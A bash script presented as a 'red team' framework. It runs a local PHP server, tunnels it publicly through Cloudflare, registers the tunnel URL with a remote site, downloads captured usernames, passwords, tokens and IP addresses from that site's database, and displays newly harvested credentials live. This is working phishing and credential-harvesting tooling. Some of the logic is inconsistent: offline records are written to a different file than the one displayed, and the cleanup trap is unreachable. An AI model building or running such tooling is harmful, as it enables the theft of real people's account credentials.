#!/bin/bash
# ===============================================================
#  TECH TONIC ENGINE v2.0 — STANDALONE AUTOMATED RED TEAM SYSTEM
#  Prepared by: CyberTeam 2026
# ===============================================================

# CHANGE THIS LINK TO YOUR ACTUAL PRODUCTION SITE
BASE_URL="https://ttcsec.gt.tc"

# Clean local cache workspace
rm -f local_log.txt && touch local_log.txt
rm -f cloudflared.log

clear
echo -e "\033[1;36m===============================================================\033[0m"
echo -e "\033[1;36m   [+] BOOTING AUTOMATED TECH TONIC FRAMEWORK ENGINE...       \033[0m"
echo -e "\033[1;36m===============================================================\033[0m"
echo -e "[*] Initializing local background port service..."

# 1. Start local PHP background thread
php -S 127.0.0.1:9999 > /dev/null 2>&1 &
PHP_PID=$!
sleep 1

# 2. Build automated quick tunnel route paths
echo -e "[*] Requesting secure public routing domain from Cloudflare..."
cloudflared tunnel --url http://127.0.0.1:9999 > cloudflared.log 2>&1 &
CF_PID=$!

# Wait for tunnel initialization map
sleep 7
TUNNEL_URL=$(grep -o 'https://[^ ]*\.trycloudflare\.com' cloudflared.log | head -n 1)

if [ -z "$TUNNEL_URL" ]; then
    echo -e "\033[1;31m[-] CRITICAL ERROR: Cloudflare connection timed out. Check networks.\033[0m"
    kill $PHP_PID $CF_PID
    exit 1
fi

echo -e "\033[1;32m[+] SECURE ROUTE CREATED: $TUNNEL_URL\033[0m"
echo -e "[*] Synchronizing current endpoint rules with remote host..."

# 3. Inform web instance of the fresh endpoint using custom HTTP headers
curl -s -H "X-KALI-TUNNEL: $TUNNEL_URL" "$BASE_URL/index.php" > /dev/null

echo -e "\033[1;32m[+] ROUTING CHANNELS SUCCESSFULLY SYNCED!\033[0m"
echo -e "[*] Auditing remote data indexes for offline submissions..."

# 4. Fetch data captured by MySQL while Kali was powered off
OFFLINE_JSON=$(curl -s "$BASE_URL/fetch_offline.php")

if [ ! -z "$OFFLINE_JSON" ] && [ "$OFFLINE_JSON" != "[]" ]; then
    echo "$OFFLINE_JSON" | jq -c '.[]' 2>/dev/null | while read -r row; do
        ts=$(echo "$row" | jq -r '.timestamp')
        ip=$(echo "$row" | jq -r '.ip_address')
        pr=$(echo "$row" | jq -r '.provider')
        un=$(echo "$row" | jq -r '.username')
        pw=$(echo "$row" | jq -r '.password')
        tk=$(echo "$row" | jq -r '.token')

        printf "============================================================\n⏰ TIMESTAMP     : %s (OFFLINE LOG)\n🌐 IP ADDRESS    : %s\n🔑 PROVIDER      : %s\n👤 USERNAME      : %s\n🔒 PASSWORD      : %s\n🎟️ TOKEN NUMBER  : %s\n============================================================\n\n" "$ts" "$ip" "$pr" "$un" "$pw" "$tk" >> local_demo.txt
    done
    echo -e "\033[1;33m[+] RETRIEVED OFFLINE REGISTRATIONS FROM DATABASE!\033[0m"
else
    echo -e "[+] Zero database latency: No backlog submissions found."
fi

echo ""
echo -e "\033[1;36m===============================================================\033[0m"
echo -e "\033[1;36m    TECH TONIC BROADCAST TERMINAL -- MAINTAINED BY CYBERTEAM  \033[0m"
echo -e "\033[1;36m===============================================================\033[0m"
echo ""

# 5. Continuous Live Projection Mappings
tail -f local_log.txt | awk '
/^===/ {print "\033[1;36m" $0 "\033[0m"} 
/TIMESTAMP/ {print "\033[1;33m" $0 "\033[0m"} 
/IP ADDRESS/ {print "\033[1;35m" $0 "\033[0m"} 
/PROVIDER/ {print "\033[1;34m" $0 "\033[0m"} 
/USERNAME/ {print "\033[1;32m" $0 "\033[0m"} 
/PASSWORD/ {print "\033[1;31m" $0 "\033[0m"}
/TOKEN NUMBER/ {print "\033[1;46;30m" $0 "\033[0m"}
'

# Clean shutdown trap routing rules
trap "kill $PHP_PID $CF_PID; rm -f cloudflared.log; exit" INT TERM EXIT
